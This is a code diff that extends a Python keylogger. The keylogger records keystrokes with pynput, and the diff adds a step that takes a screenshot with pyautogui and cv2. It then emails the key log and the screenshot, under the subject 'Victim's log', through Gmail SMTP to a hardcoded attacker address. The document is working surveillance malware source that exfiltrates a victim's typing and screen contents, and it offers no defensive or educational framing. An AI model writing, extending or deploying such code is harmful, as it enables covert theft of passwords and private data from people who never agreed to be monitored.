@@ -1,7 +1,12 @@
-import getpass
 import smtplib,ssl
-
 from pynput.keyboard import Key, Listener
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.image import MIMEImage
+import pyautogui
+import cv2  #opencv-python
+import numpy as np
+import os
 
 #email info
 email = "keyloggeremailtester@gmail.com"
@@ -79,7 +84,7 @@ def on_press(key):
         elif key.vk == 103: num = 7
         elif key.vk == 104: num = 8
         elif key.vk == 105: num = 9
-        word += num     #TODO: should we make note of whether this is a numpad button?
+        word += num
 
     #numpad decimal
     elif hasattr(key, 'vk') and key.vk == 110:
@@ -98,13 +103,32 @@ def on_press(key):
         return False
 
 
-#send email
+#take screenshot and send email
 def send_log():
+    #take screenshot
+    img = pyautogui.screenshot()  #PIL screenshot
+    img = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)  #convert to numpy array
+    cv2.imwrite("scrnsht.png",img)
+
+    #attach message
+    final = MIMEMultipart()
+    final['Subject']='Victim\'s log'
+    final['From']=email
+    final['To']=email
+    final.attach(MIMEText(email_log))
+
+    #attach screenshot
+    screenshot=open('scrnsht.png','rb')
+    img=MIMEImage(screenshot.read())
+    img.add_header('Content-Disposition','attachment',filename="scrnsht.png")
+    final.attach(img)
+
+    #actually send the email
     try:
         server = smtplib.SMTP_SSL('smtp.gmail.com',port)
         server.ehlo()
         server.login(email,password)
-        server.sendmail(email,email,email_log)
+        server.sendmail(email,email,final.as_string())
         server.close()
         print("Email sent")
     except:
